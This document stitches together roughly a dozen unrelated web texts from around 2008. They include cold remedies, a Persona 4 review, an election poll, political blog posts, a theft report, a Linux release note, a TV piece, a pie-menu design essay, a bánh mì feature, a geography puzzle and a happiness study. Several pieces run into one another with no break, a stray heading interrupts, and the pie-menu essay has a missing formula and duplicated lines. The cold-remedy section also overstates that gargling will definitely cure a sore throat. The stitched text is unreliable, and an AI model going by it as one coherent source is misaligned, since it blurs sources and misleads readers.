It may sound like an advice from your grandmother but practice has shown that washing your mouth with salt water is one of the cures for sore throat .
Dissolve half a teaspoon of salt into a class of warm water and make five to six gargles .
These will definitely relief your sore throat .
8 . Do not smoke
Although you should stop smoking for a number of reasons , smoking when you are cold has additional disadvantages .
Smoking can aggravate the symptoms of cold , while aggravating can also be passive smoking .
9 . Watch your diet
Although it is not proven that diet can help you cure from cold , eating fruits and vegetables full of vitamin C can help you overcome faster from cold .
Vitamin C strengthens the protection of the body , protects it from virus diseases and contributes to better functioning of white blood cells , the role of which is to fight viruses .
Other food , which can assist you in recovering faster from cold , includes :
Garlic
Honey
Peppermint
Oranges , lemons , grapefruit , parsley , celery , cauliflower
Foods containing zinc
10 .
Do not Exercise
Avoid exercise and all sorts of physical activity , for 3 - 4 days in order to give your body a chance to save forces for fighting the virus .

There is something to be said about Atlus .
This company is capable of many great things .
This game , is definitely one of their crowning jewels .
For me to express my absolute respect for the company would require more space than the 5,000 character limit of this site would allow .
So instead , I 'll go into further detail about not only what made Persona 4 a fantastic game , but also the pinnacle of JRPGS ( in my opinion ) to this date .
First of all , let 's talk about why I immediately consider this game to be superior to its predecessor .
The cult classic Persona 3 / Persona 3 FES , is argued to be a better game and the most common ( frustratingly so ) arguments are because it has a better atmosphere and storyline .
Allow me to say , that atmosphere does not mean a better game .
My biggest issue with the atmosphere of the first game , while I did enjoy it , was that it made anything outside of the suppressive feeling in the game , feel extremely out of place in the game .
While that is usually the point of such moments , the drastic difference just makes you feel like there is a transition that you missed getting there .
Persona 4 does not have that problem .
It has a naturally lighter atmosphere and the way the characters act in said atmosphere , makes for a much less jarring change between and a much more natural transition for the characters .
Then there is the issue with the storyline argument .
While I will agree that the overall story of Persona 3 is fantastic and it has some great character mini-arches throughout , the biggest issue is that almost none of the main characters are likable for the vast majority of the game .
With no character development for any of them for far too long , the only character I ended up liking for the longest time was one who was there for less time than most of the Social Links in game .
Persona 4 did not make this same mistake .
It gave access to Main Character Social Links almost immediately after gaining the person in your party .
Not to mention that the way the dungeon system works , has you getting to know people even before you get them as party members .
Another thing this game did better was dungeons .
It separated them all by person and level range in the Persona 4 which I thought was really smart .
So what does Persona 4 have wrong with it ?
Well , nothing that I would consider a universal problem .
If you do n't like long games , give this one a pass .
I would have to say the average first play through of the game is a minimum of 80 hours if you are not entirely invested in doing things and over 100 + hours if you really get into it .
Like I said , not a big issue but I can see some people having an issue with it .
The other thing is ... how do I put this ... do you know what " moe " ( pronounced " mow-ay " ) is ?
" Moe " is like a really bright , bubbly type character with a high voice and some " overly cute " mannerisms .
Well there is one in this game by the name of Teddie .
Like I said , not a universal problem , but I do know that there have been people who quit the game because of this character .
All - in - all , I award this game a 10/10 and a recommendation to buy it , either in this form or its portable form on the PSVita Persona 4 Golden .

Oct. 31 , 2008  --
The 2008 campaign enters its final weekend with an advantage for Barack Obama in tone as well as substance : Likely voters are twice as apt to say John McCain has gone too far in criticizing Obama as to say Obama 's crossed the line in taking on McCain .
It might be worth it for McCain if his criticisms were gaining traction -- but the latest ABC News / Washington Post tracking poll suggests otherwise .
Slightly more likely voters see a bigger risk that McCain would create too few government regulations than that Obama would create too many -- one of McCain 's lines of argument .
And 54 percent see Obama as a " safe " choice for president , deflecting another McCain thrust .
Click here for PDF with charts and questionnaire .
On issues , Obama continues to lead in trust to handle the economy and taxes -- the latter especially unusual for a Democrat -- and they run about evenly , 49 - 46 percent , in trust to handle a crisis , another area in which McCain has struggled to gain greater leverage .
Economic concerns are boosting Obama in some usually more - Republican groups ; in vote preference he runs evenly with McCain , for example , among white men who cite the economy as the single most important issue in their choice .
As a result Obama trails among white men overall by 9 points -- a group John Kerry lost by 25 .
Even with these advantages for Obama the two are running closely in some customary swing voter groups : among independents , 50 - 46 percent Obama - McCain ; among white Catholics , 48 - 49 percent ; among married women , 48 - 49 percent .
And movable voters , the small group -- now just 8 percent -- who have n't made up their minds for sure , split 31 - 34 percent , with the rest fully undecided .
Obama gains his overall advantage , 53 - 44 percent among likely voters , with help from the fact that more Democrats than Republicans are likely voters .
Democrats account for 37 percent of likely voters in this ABC / Post poll , about their usual level in exit polls .
Republicans account for 28 percent , well under their norm .
That differential is greater than in previous presidential elections since 1984 , in which voters have been anywhere from evenly divided between the two parties to +4 points Democratic .
And political party identification was just + 2 points Democratic in the latest midterm election in 2006 .
Obama Holds Edge Over McCain on Enthusiasm
If this election were a replay of past recent ones , more Republicans would vote , and the outcome would be closer than the current standings .
But other data counter that scenario , including a five - year Democratic gain in allegiance among all adults , from 31 - 31 percent parity in 2003 to an average 10 - point Democratic advantage , 36 - 26 percent , in ABC / Post polls this year .
It 's also a year in which enthusiasm for Obama is running far higher than it is for McCain , the incumbent Republican president has broken the record for disapproval in 70 years of polling , economic unease is at historic highs and new voter registration has soared , particularly among young adults , one of Obama 's single best support groups .
Voters Critique McCain's Criticisms
Fifty percent of likely voters say McCain has " gone too far " in his criticisms of Obama , twice the number who say Obama 's gone to far in criticizing McCain .
An additional 16 percent – almost all chiefly McCain partisans -- say he 's not gone far enough .
That leaves just 32 percent who say McCain 's handled the tone of his campaign " about right , " vs. 67 percent who say that about Obama .
These views are strongly partisan , but appear even among McCain 's core supporters .
While 27 percent of Republicans say McCain has not gone far enough in criticizing Obama , about as many , 23 percent say he 's gone too far .
Among conservatives , 30 percent say McCain 's not gone far enough – but 27 percent say he 's gone too far .
And while 74 percent of Democrats say McCain 's gone too far in criticizing Obama , just 44 percent of Republicans say Obama 's crossed the line with their party 's candidate .
Economy a Critical Advantage for Obama Over McCain
There also are political and ideological splits on the question of government regulation .
Two - thirds of liberals and Democrats say lack of regulation by McCain is a bigger risk than over - regulation by Obama ; seven in 10 conservatives and Republicans say the opposite .
But moderates divide by 51 - 31 percent in Obama 's favor , independents by a much closer 47 - 41 percent .
The question is a toss - up in the 16 most closely contested battleground states .
While McCain 's pushed it , these results show scant movement from an ABC / Post poll Oct. 11 .
At 46 percent , Obama 's overall support among whites is numerically his best of the campaign , and the best for a Democrat in exit polls since Jimmy Carter in 1976 ( although Ross Perot deflated Bill Clinton 's tally in 1992 and 1996 ) .
Among other groups , Obama leads McCain by 13 points among women , 55 - 42 percent , similar to Al Gore 's 11 - point margin among women in 2000 .
The difference is that Gore lost men by 11 points , while today they divide by a scant 3 points , 49 - 46 percent , Obama - McCain .
Obama 's losing white men by 9 points – but , as noted , Kerry lost them by 25 , Gore by 24 .
The difference , above all else , appears to be the economy .
It towers above other issues as likely voters ' top concern , cited by 53 percent .
And it matters , including in some of those traditionally less - Democratic groups .
Among men who cite the economy as their top concern , Obama leads McCain , 54 - 41 percent .
Among white men only , economy voters divide evenly , 49 - 49 percent .
White men mainly concerned with issues other than the economy , by contrast , go 57 - 39 percent for McCain .
METHODOLOGY : Interviews for this ABC News / Washington Post tracking poll were conducted by telephone Oct. 27-30 , 2008 , among a random national sample of 1,580 likely voters , including landline and cell - phone - only respondents .
Results have a 2.5 - point error margin for the full sample .
Questions 10 and 33 were asked Oct. 28 - 29 among 673 likely voters ; those results have a 4 - point error margin .
Questions 36 , 37 and 38 were asked Oct. 29 -30 among 924 likely voters ; those results have a 3 - point error margin .
Sampling , data collection and tabulation by TNS of Horsham , PA .
I wrote in an earlier post , that one of my wishes for the Obama Presidency was signature and ratification of the Rome Statute which constitutes the International Criminal Court in The Hague .
I still believe this should be done to restore the trust of the world in American politics by accepting accountability to international standards .
Initially my idea was to find a way to hold President Bush accountable and try him for his crimes in a court of law .
However , after some research , I doubt that end would be achieved by joining in the ICC .
The Rome Statute states explicitly that it ’s rules apply to the signatory states only after the ratification unless it ’s jurisdiction was approved retroactively by the signing state .
At least that is how I understood the text .
There may be lawyers among you who know better than me and I would very much appreciate to learn more from you .
I do think it is possible that an Obama Administration signs the statute ( or re-signs it , it has already been signed by the Clinton Administration , but the Bush Administration “ un- signed ” it ) and the Democratic Congress ratifies it .
I do n’t believe it would be made retroactive though , because that would amount to handing Bush , Cheney , Rumsfeld and some more to The Hague .
Barack Obama , among other things , has stressed bi-partisanship and just imagine the Republican ’s and their voters ’ reaction .
So where does that leave you ?
You will have to go it alone .
And the Bush Administration must be held accountable for their actions .
There is a number of crimes that have been assembled by the National Lawyers Guild in an attempt to impeach Bush .
In November Joel S. Hirschhorn wrote an article in MWCnews saying :
I want President Obama soon after taking office to go on television and announce the formation of a special group of outstanding jurists and attorneys to make a recommendation whether or not the US Justice Department should bring criminal charges against George W. Bush .
Based on earlier analyses , including work by the American Bar Association , I have no doubt they will recommend indictment .
I could not agree more .
The documentary “ Taxi to the Dark Side ” ran on a German tv-channel yesterday and it brought back the atrocities of the “ War on Terror ” .
And yes , I would like to see Bush , Cheney , Rumsfeld , Gonzales , Yoo and some more held accountable for these crimes and more in a court of law .
Critics say Bush is rushing through unpopular last - minute reforms
The Bush administration has made it easier for drilling , mining and major construction projects to go ahead without a full scientific assessment .
Revised rules mean agencies will no longer have to consult scientists about whether projects , such as the building of dams or mines , would harm wildlife .
Environmentalists say the changes could take away protection for animals and plants facing possible extinction .
Democratic President - elect Barack Obama has vowed to reverse the new rules .
Modifications to the Endangered Species Act ( ESA ) are expected to come into effect in about 30 days .
Republican supporters of the changes , along with developers and some federal agencies , argue the current system of environmental reviews causes delays to projects , pushing up costs .
Critics of President George W Bush say his administration is trying to rush through unpopular reforms during his last days in office , and correspondents say environmental groups are likely to challenge the changes in the courts .
Common sense ?
The changes proposed by the Bush administration would let federal agencies make decisions on planned projects without a full scientific assessment as to their likely impact on the environment .
Under current rules , the impact of such projects must be assessed by experts .
The Endangered Species
Act is not the right tool to set climate change policy
Dirk Kempthorne
Secretary of the Interior The US interior department said the " common sense modifications " were a " narrow update of existing regulations " prompted by concerns the ESA would become a " backdoor for setting climate change policy " .
" The rule strengthens the regulations so the government can focus on protecting endangered species as it strives to rebuild the American economy , " said Secretary of the Interior Dirk Kempthorne .
" The Endangered Species Act is not the right tool to set climate change policy . "
The White House has previously denied the late spate of rule changes is politically motivated .
Mike Daulton , a director of the National Audubon Society , an environmental group , urged Mr Obama and Congress to reverse the " destructive changes " .
" The swan song of this administration is par for the course - special treatment for special interests at the expense of sound science and conservation . "
Endangered list Senior Democrats have questioned the " one- minute - to - midnight " rules which , if in place before Mr Bush leaves the White House , would be harder for Mr Obama to repeal when he takes office on 20 January 2009 .
Mr Obama 's chief of transition , John Podesta , has said the incoming president would review the last - minute actions , and seek to repeal those that are " not in the interests of the country " .
Mr Bush has already been criticised by environmentalists for adding fewer than 10 species of plant and animals a year to the endangered list .
That contrasts with former President Bill Clinton , who added an average of 65 species a year .

The WristStrong Saga
Relive the entire WristStrong saga from fracture to phenomenon .
When Westminster police responded to a routine disturbance call last week , they stumbled onto a herd of wicker reindeer in the living room , strings and strings of Christmas lights -- some plugged in , others just tossed around the house -- a few faux Christmas trees , several snowmen and one too many inflatable Santa Claus figures .
It all seemed just a little much , officers thought , even for the most devoted holiday fan .
Then they remembered the theft reports .
For weeks , residents of a Westminster neighborhood along the border with Huntington Beach had been complaining about their disappearing holiday decorations .
On Monday , police said they had their suspected grinch : Vuong Pham , 48 .
Westminster police found a stockpile of holiday decorations in the home , on the roof and in the backyard , Officer Cameron Knauerhaze said .
“ We had to use two city trucks and a police truck to take all the property to the police station , ” he said .

Officers were called to Pham ’s home in the 8400 block of Heil Avenue last week in response to a fight between Pham and his son , Knauerhaze said .
Although there were no arrests that day , officers walked into the home , saw the decorations and recalled a series of thefts reported in the neighborhood near Newland Street and Heil Avenue .
To be fair , police said , the cache was n’t confined to decorations for the season of giving .
The trove included a few alabaster fountains , a collection of rare bonsai trees and an assortment of outdoor lighting .
“ This guy had something in every room , ” Knauerhaze said .
“ We do n’t understand why someone would do this , ” he added .
“ We ’re trying to talk to the guy , to find out if he ’s got other issues going on in his life , but for now , it is what it is . ”

Pham faces charges of grand theft and possession of stolen property , he said .
While Pham was en route to jail Monday night , several victims showed up at the police station to claim their property .
One woman and her family picked up an electric train .
Another found her missing Santa globe .
And the flock of reindeer went home for the holidays .

Date Wed , 24 Dec 2008 15:52:49 - 0800 ( PST ) From Linus Torvalds <> Subject Happy v2.6.28
It does n't really matter what day it is , or what holiday ( if any ) you 're
celebrating , because even if you sit at home , alone in your dank basement ,
without any holidays or friends , I bring you a tiding of great cheer : you
can now download Linux - 2.6.28 , and compile it to your hearts content !
Listen to the cheerful grinding of your harddisk as you reboot into an
all - new kernel - and I 'm sure that if your computer could smile , it would
have a big silly grin on its non-existent face .
So as you sit there in
your basement , give your computer the holiday cheer too .
In fact , even _if_ you have friends or family , leave them to their endless
toil over that christmas ham or turkey , and during the night , when they 're
asleep , you can give them that magical present of a newly updated
computer .
When they wake up tomorrow morning , tell them how you saw Santa
crawl down the chimney with his USB stick in hand , updating the OS of all
good boys and girls .
Ho , ho , ho ,
Linus " almost Santa " Torvalds

There has been a lot of talk lately about what can be done to fix Heroes , as the consensus grows that the show is suffering through some big creative problems .
Complaints abound about the often sloppy writing , as the motivations become murkier and increasingly hard to swallow , with too many twists done for their own sake , and not as a believable action on the part of a character .
The audience dissatisfaction seems to be reflected in the ratings for the series , with a 21 % drop in total viewers from where the show was a year ago .
The troubles the show is going through finally had a major result on the creative side this week , with the news that two of the main Heroes writer / producers , Jeph Loeb and Jesse Alexander , had been let go from the series .
According to Variety , series creator Tim Kring is said to be working to , " get back to the show 's comicbookish good vs. evil themes and to emphasize character development more than plot twists . "
There 's no word yet on who , if anyone , might replace Loeb and Alexander , who were said to help guide the writers room while Kring dealt with many of the other issues a show as large and technically intense as Heroes call for .
But if NBC and Kring are on the lookout , IGN offers the following candidates :
Six writer / producers who could bring back the kind of focus and strong storylines Heroes needs to become the great show it once was and could be again .
Note : I 've tried to be ( partially ) realistic here , and not pick guys like JJ Abrams , Joss Whedon , Ron Moore or Eric Kripke who are clearly way too busy with shows or other projects of their own to join Heroes … though in a couple of cases , I did stretch the possibilities to include a couple of folks who would need an extra bit of coaxing .
Jeffrey Bell
Previous Credits Include : The X - Files , Angel , Alias
Bell got his start in the later years of The X - Files , crafting stories about everything from a person whose emotions control the local weather to a man who is turning into metal .
He then really upped his game on Joss Whedon 's Angel , which he joined in the third season , writing several key episodes of the increasingly serialized and compelling series .
By Season 5 , Bell was serving as showrunner , and co-wrote ( with Whedon ) the fantastic Angel series finale .
Bell then moved to Alias , for that show 's final two years .
That once - great series had undergone some huge missteps by that point , before Bell arrived .
But still , he showed his talent at creating stories that were fun and also gave insight into the characters , such as " Ice , " which stood out as possibly the best ever episode of Alias to focus on Michael Vaughn , and certainly was a highlight of an otherwise unremarkable period on the series .
With The X - Files , Angel and Alias , Bell has proven time and again he can deliver the goods when it comes to genre TV , while also offering the strong characterization Heroes so often lacks .
And those three series also had periods where they were heavily serialized and others were they were more stand alone – something Heroes needs to create a better balance between , since they seem so remiss at doing any episodes that take a break from messily conceived ongoing plots in order to focus more on just a couple of characters .
But if you 're looking for serialization , Bell 's certainly your man , since he not only worked on the incredibly tightly woven fourth season of Angel , but also Day Break , which told a fast moving storyline over its 13 episode run .
Bell is currently working on CBS 's Harper 's Island as the showrunner , meaning he 's not exactly the most available candidate on this list .
But considering Harper 's is a serialized murder mystery series on a network where procedurals rule , I would n't hold my breath for its success .
NBC already has an investment in Heroes , and Bell has already shown he can jump on a show that 's been running for awhile and fit right in .
This blog post is a hands - on experiment .
If you have Firefox 3 , before you read any further , please go to this page and try out the demo .
( Unfortunately , the demo will only work in Firefox 3.0 and later , because it uses some cutting - edge features of the Canvas object that are n’t supported in Internet Explorer , Safari , or older versions of Firefox .
I believe strongly in presenting web content in a cross - browser compatible way , but sometimes for feature demos , requiring Firefox is unavoidable .
This is Mozilla labs , after all . )
Anyway , the demo presented two different styles of pop-up menus and asked you to repeatedly select the same menu item .
Which menu style made the task easier ?
Why do you think that was ?
A Brief History of Pie Menus
Pie menus are nothing new .
Don Hopkins has been evangelizing them for decades .
Mozilla has experimented with pie menus before , although ( as far as I know ) the experimentation has n’t led to any core browser features .
Also , here ’s Radial Context , an extension that replaces the Firefox context menu with a pie menu ; unfortunately , it ’s no longer actively maintained and is only compatible with Firefox versions 2.0 and older .
[ UPDATE : Here is an updated version of the Radial Context extension that works with Firefox 3 . ]
Do you know of any good pie menu implementations for leading browsers ?
If so , please leave a link in the comments .
For example , I know that Opera has mouse gestures , but does it have pie menus ?
Fitts ’ Law
The reason why pie menus are good has to do with Fitts ’
Law , one of the most reliable theories in all of HCI , which has been empirically verified time and time again .
Sadly , a lot of people who do UI design , even professionals , do n’t know about this simple and useful formula :
where :
T is the time taken to move a pointing device to a target .
It ’s a function of :
is the time taken to move a pointing device to a target .
It ’s a function of : a and b are constants , which depend on the hardware and the individual person using it , so they ’re generally outside the control of UI designers .
and are constants , which depend on the hardware and the individual person using it , so they ’re generally outside the control of UI designers .
D is the distance from the starting point to the center of the target .
is the distance from the starting point to the center of the target .
W is the width of the target , in the direction of motion .
In other words : bigger things are easier to hit than smaller things , and closer things easier to hit than those farther away .
( No duh , Sherlock ! )
In a pie menu , Dis very low , because the pie slices are all adjacent to the starting point .
And W ( the width of the target ) is correspondingly large , since each pie slice occupies the largest possible area .
( In some implementations , the pie slice area effectively extends all the way to the edge of the screen , making W very large indeed . )
Therefore Fitts ’
Law predicts that the time to aquire the target in a pie menu should be minimal .
Habituable Mouse Gestures
But that ’s not all .
Besides Fitts ’
Law , pie menus are good because of the habits they teach .
What are you doing with your hands when you select from a menu ?
You ’re making a mouse gesture while holding down the mouse button .
We usually think of the menu that you see on the screen as a UI element , but here ’s a different way to think about it : the mouse gesture IS the command .
The menu on the screen is just visual feedback to help you find the right mouse gesture .
With a traditional list - style menu , the mouse gesture consists of moving downward by a certain distance .
Choosing a different item means moving a different distance downward .
With a pie menu , the gesture consists of moving a certain direction .
Choosing a different item means moving a different direction .
Gestures that vary by direction of movement are easier to distinguish , kinesthetically , than gestures that vary only by distance of movement .
That means that the gestures involved in selecting from a pie menu are easier to perform without looking .
And it ’s always easier to form a habit around a UI interaction when it can be performed without looking .
A good user - interface is one that naturally teaches the user effective habits .
And pie menus are an effortless way of learning efficient mouse gestures .
Pie Menus in Ubiquity
For a UI widget with so many advantages , pie menus are sorely underused .
They ’re used in computer games ( The Sims being the best - selling current example ) , and they ’re used in ( shameless plug ) Songza — click on the title of a song to see a pie menu .
But pie menus are conspicuously absent from most popular UI libraries and toolkits .
They ’re not in the Human Interface Guidelines of Mac , Windows , Gnome and KDE .
Many UI designers do n’t even know they exist .
Sure , round things are a little harder to program than square things , since they tend to involve polar coordinate math , but it ’s not that much extra effort .
I ’m particularly interested in the possibility of using pie menus to replace the Ubiquity context menu .
( Wait , Ubiquity has a context menu ? )
Yes , it does , but it ’s not well - documented or widely - used .
It ’s also not very useful , since it ’s currently a big , unweidly , unsorted , list of random commands which may or may not be applicable .
It would be cool if right - clicking on some selected text — or an image or link , for that matter — resulted in a menu like this :
Not a Panacea
Just replacing a rectangular context menu with a pie menu does n’t magically make everything better , though .
In fact , it introduces a new set of problems that need to be solved .
One of the problems that we ’d immediately face is the large number of Ubiquity commands available .
At my count , there are no fewer than twenty built - in Ubiquity commands which can take arbitrary text for one or more of their arguments .
That means that when we bring up a Ubiquity context menu on a text selection , we start at a baseline of twenty commands , before adding in third - party command subscriptions or specialized commands that can act on the particular data - type of the selection .
Even if we increase the specificity of commands and aggressively filter non-applicable commands out of the context menu , we ’re still looking at a large and ever - growing set of commands .
Time for another demo .
Try out the pie menu on this page in order to understand the usability problems that arise when there are too many items in a pie menu .
( Basically , when the wedges get too small , you lose the benefit of being able to select one without looking at it . )
One approach to this problem is to allow a hierarchy of pie menus .
For example , if we took the previous illustration as a starting point , then if the user mouses over the “ Add to … ” pie wedge , they might see a new subsidiary pie menu pop up with the list of “ Add to … ” subcommands .
Like this :
( I do n’t have an interactive demo for this yet , unfortunately .
It involves a lot more programming than I wanted to do for this blog post . )
I think hierarchical pie menus will be a big step forward .
But another problem still remains .
To understand what it is , here is the third and last interactive demo .
Give it a try .
Annoying , is n’t it ?
If the number of items in the pie menu can change , then a given item will not always be in the same place .
And if it ’s not always in the same place , then you have to visually double - check the menu every time you use it .
That means the habit - forming benefits of pie menus are lost .
And here ’s the rub : the number of items in the Ubiquity context menu is guaranteed to change .
Not only does the list of applicable commands vary depending on the type of content you have selected , but the total number of commands that Ubiquity knows can grow without bound as the user subscribes to third - party commands .
There ’s simply no way of fixing the number of items in the context menu .
I do n’t have a good solution to this yet .
I have some vague ideas about keeping the most - used items in the main pie menu , which has a fixed number of slices ( perhaps eight ? ) , while shunting the variable number of lesser - used commands off to a variable number of hierarchical sub-menus .
But it ’s very much an open question .
As always , I would love to hear any suggestions and feedback you have .
A baguette , still warm from the oven , its golden crust trellised with cracks .
Sandwiched inside , a bright green thatch of cilantro and jalapeños , a tangle of pickled carrots and daikon , a smear of pâté .
Loaded between that , maybe a layer of rich barbecued pork or zesty meatballs , even spicy sardines .
This is bánh mì , an addictive Vietnamese street food and the culinary pay dirt of French colonialism .
Across Westminster ’s Little Saigon , old men gossip and read the morning copy of Viet Bao at metal cafe tables , sipping glasses of strong coffee laced with sweetened , condensed milk and crunching into the day ’s first bánh mì .
There are shops selling the community ’s unique fast food everywhere , tucked between coin - op laundromats and fruit stands loaded with jackfruit and durian , hidden like gifts in a concrete horizontal landscape of strip malls .
Local cooking instructors Diane Cu and her partner of a dozen years , Todd Porter , who live in nearby Costa Mesa , spend nearly as much time in these little shops as the old men .
( They have an entire section devoted to bánh mì on their website , www.whiteonricecouple.com.)
The Vietnamese coffee shops and French bakeries form a patchwork quilt of both cultures , offering boba and croissants , spring rolls and beignets , plantains and pennywort tea .
It ’s easy to see why they ’re so inviting , why loyal patrons scout out their preferred cafes -- and stay away from others .
“ I think my dad knows where we go , ” says Cu , explaining that her father avoids her favorite shops so that Cu wo n’t tell her mother where he is and cut into his coffee shop time .
Cu , whose family moved from Da Nang , Vietnam , to Southern California when she was a child , and Porter , a native of Oregon , explain that a great bánh mì starts with a great baguette .
The best are lighter than many European - style baguettes , baked with a percentage of rice flour along with the wheat flour .
Fresher than fresh
In Westminster , the biggest Vietnamese community outside of Vietnam , most bánh mì shops are also bakeries .
Often tiny storefronts deepen into long rows of ovens , where freshly baked baguettes commonly are pulled out every few minutes .
“ An hour and a half is considered old , ” Cu says .
“ Anything that ’s not hot is half - price . ”
Even so , often baguettes are priced 2 for 1 -- as are the bánh mì in many shops .
The price of bánh mì is also one of its key components :
Most sandwiches go for under $ 3 .
Even that ’s considered a lot in Westminster , but prices have risen lately with the rise in food prices ( especially flour ) , Cu says .
" $ 2.50 a sandwich is outrageous , ” she says , remembering days when the sandwiches cost less than $ 2 .
After the baguette , the fillings are the most important aspect of the sandwich , a savory combination of Vietnamese , French and California components .
Spicy Chinese - style pork barbecue laced with lemon grass and pickled daikon ; baguette and pâté ; cilantro and jalapeño .
It ’s the perfect post - colonial hybrid .
If you ca n’t make it to your nearest bánh mì shop , it ’s easy to make your own .
Sure , it wo n’t have the same atmospheric setting ( your baguette just pulled warm from a metal cart , the caffeine - fueled camaraderie ) , but it beats getting stuck in traffic or having to wait in long lines .
Making bánh mì is more a matter of assembly than cooking , especially when you go with an easy filling of sardines ( a classic bánh mì ingredient ) instead of a more labor - intensive barbecue .
A single baguette yields four generous sandwiches -- or one long one , if you want to have a bánh mì party .
Spread the bread with a thin layer of mayonnaise , another of prepared pork liver pâté ( both ingredients signal the French influence ) , then break up whole sardines -- those packed in tomato sauce are favored -- with a pair of chopsticks .
Cu points out that although most Vietnamese will keep the little bones intact , it ’s easy to remove them if you like .
Then load the sandwich with pickled carrots and daikon , slices of cucumber and jalapeño , and a generous amount of cilantro and mint .
Cu and Porter , who just got back from a trip to Vietnam to visit Cu’s relatives , say that although mint is n’t customary in Southern California bánh mì , it ’s common in Vietnam , as is Vietnamese coriander ( rau ram ) .
Slivered carrots and daikon , quick - pickled in brine for less than an hour , are a standard component in bánh mì , although Cu saw them replaced with fresh green papaya while in Vietnam .
( “ We saw cilantro once in Da Nang , ” says Cu , of the fresh herb so prevalent in Southern California bánh mì . )
A few more sprigs of cilantro , stems and all , then a dash of soy sauce and you ’re done .
As Cu talks , Porter has been busy brewing Vietnamese coffee on the other side of the kitchen , using one of the metal coffee filters the couple has stacked by their Breville espresso maker .
A few tablespoons of coffee ( Cafe du Monde , a New Orleans brand made with chicory , is popular in the Vietnamese community ; Porter also likes to use Ethiopian beans or an espresso blend ) go into the little filters , which go for about $ 4 at an Asian grocery store .
The coffee is then brewed straight into a glass filled with a pour of sweetened condensed milk , where the coffee drips to form a gorgeous layer of black over the pale ivory of the milk .
For hot coffee ( café sua nóng ) , Porter nests the glass into a tumbler filled with hot water to maintain the temperature , then stirs the milk and coffee .
For iced coffee ( café sua dá ) , he mixes the drink , then pours it over ice .
A glass of milky coffee , a sardine bánh mì , the crusty baguette loaded with cilantro , chiles and fresh mint from their garden .
Can you make it differently ?
Of course , says Cu. Bánh mì is post - colonial comfort food :
The sandwiches are by their very nature adaptive , changing with the territory , reflecting seasonal ingredients and taking on the personality of whoever makes them .
“ I would never diss what your mom makes , ” Cu says .
“ My mom does n’t make it the way I do either . ”

The Longest Line
Clifford Pickover posed the task of finding the longest line in the United States of America .
The rules for such a line were simple : the line could not pass outside America and could not go through the oceans and the Gulf of Mexico .
In other words , the line had to stay inside the continental boundaries .
Cliff calls this line the ultralineamentum ( from the Latin word " lineamentum " [ a line drawn with pen or pencil ] ) .
Below you will see my solution to the problem .
I downloaded a copy of all of the GPS landmark data from some supposed source at the CIA ( http://www.evl.uic.edu/pape/data/WDB/).
From this , I had to get out all of the coastline and boundary data for the United States .
This actually took quite a bit of labor since they have 4 levels of " useful " data , but they do n't rank them strictly as " all the 1s together " and " all the 2s together " and so on .
It was actually quite annoying .
But in any case , I ended up using 52332 points for the United States .
The only real screwup that I ended up keeping was the US / Canada border in NW Washington as the part that goes into the Pacific , and not just the land .
But I do n't feel like poring through all of the coastline data to figure out which points I 've left out .
Those points do n't matter for this case because when I ran my computer program it did n't find the longest line all the way out to the ocean , so it certainly could n't find the longest point closer in !
In any case , I tested each pair of points to see how long the distance was on the sphere we call the Earth ( yes , there are approximations involved there ) .
If the distance was over 2700 miles , I kept that pair of points .
If not , I just threw it away .
I took the pairs of points , as well as the original map data , and transformed them to a gnomonic projection , where all great arcs are straight lines .
Next , on the gnomonic plot , I connected the points I had found if the distance was over 2850 miles .
It was pretty obvious that none of these were candidates since they all left the country .
I kept lowering the limit and eventually I finally found a line that was just barely tangent to the corner of the Florida Panhandle , as I had suspected .
Before continuing , note that for any gnomonic projection , we get to choose where the projection plane is tangent to the sphere .
If one chooses the tangent plane to be tangent near the middle of the US , you get what most maps look like .
If you go off - center , you get crazier shapes , but the key is that for ANY of the gnomonic plots , straight lines are great arcs .
In the above plot , the map looks " normal " because I chose the tangent plane to be about in the middle of the United States .
If I pick a different point , the map looks wildly different ( although note that the line is still straight , as it must be for a gnomonic projection ) .
Also note that if we plot the line on a " projectionless " map , that is where we simply use latitude and longitude as simple x- and y- coordinates , this is what the longest line looks like ( note that now it looks like a curve , since a " straight line " on a globe is actually what we call a " great arc " :
So where does this line lead to and from ?
Our journey starts at Ocean Creek by the Makah Indian Reservation in Washington ( 124° 41 ' 38 '' W , 48° 21 ' 44 '' N ) , and our amazing journey ends near 1 Ocean Drive , Jupiter , Florida , 33469 ( 80° 4 ' 29 '' W , 26° 57 ' 11 '' N ) .
The distance between these two points is an impressive 2802 miles .
Note that Ocean Creek is not the name of a city or town , but the name of the actual stream .
The photos below are the property of the USGS .
Lastly , the longest line in America ( continental US ) that is allowed to go through another country stretches from Point Arena , CA to West Quoddy Head , ME and is shown below .
It is 2892 miles long .
December 8 , 2008 — People 's happiness is largely influenced by the happiness of those they are connected to — whether they know them or not — new findings from the Framingham Heart Study suggest .
" We 've found that your emotional state may depend on the emotional experiences of people you do n't even know , who are 2 to 3 degrees removed from you .
And the effect is n't just fleeting , " study investigator Nicholas Christakis , MD , PhD , from Harvard Medical School , in Boston , Massachusetts , said in a statement .
The study is published online December 4 in BMJ .
According to the authors , happiness is a fundamental component of human health determined by a complex set of voluntary and involuntary factors .
While previous studies have identified a broad range of stimuli identified with happiness or unhappiness , none has examined the happiness of others as a key determinant of human happiness .
Furthermore , the authors point out there is evidence that emotional states can be transferred directly from 1 individual to another by mimicry .
" People can ' catch ' emotional states they observe in others over time frames ranging from seconds to weeks , " they write .
Can Happiness Spread ?
However , they note , despite this evidence , little is known about the role of social networks in happiness or whether happiness has the potential to spread .
To examine whether happiness can spread through social networks that include direct as well as indirect relationships , the investigators used data from 5124 participants from the Framingham Offspring Study to reconstruct the social fabric in which individuals are enmeshed and analyze the relationship between social networks and health .
The data included all family changes for each study participant , such as birth , marriage , death , and divorce .
In addition , there was also extensive information on participants ' closest friends , coworkers , and neighbors .
Coincidentally , many of these friends were also study participants .
The final analysis included 4739 individuals and more than 50,000 social and family ties .
Using the Center for Epidemiological Studies depression index , the investigators found that when an individual becomes happy , a friend living within a mile experiences a 25 % increased chance of becoming happy .
A coresident spouse experiences an 8 % increased chance , siblings living within 1 mile have a 14 % increased chance , and next - door neighbors , 34 % .
Popularity Leads to Happiness
However , the most surprising finding , say the researchers , was with indirect relationships .
While an individual becoming happy increases his or her friends ' chances , a friend of those friends experiences a nearly 10 % chance of increased happiness and a friend of that twice - removed friend has a 5.6 % increased chance — a 3 - degree cascade .
" We found that while all people are roughly 6 degrees separated from each other , our ability to influence others appears to stretch to only 3 degrees .
It 's the difference between the structure and function of social networks , " said Dr. Christakis .
With coauthor James Fowler , PhD , from the University of California , San Diego , the investigators also found that popularity leads to happiness and that individuals in the center of their social network clusters are the most likely to become happy .
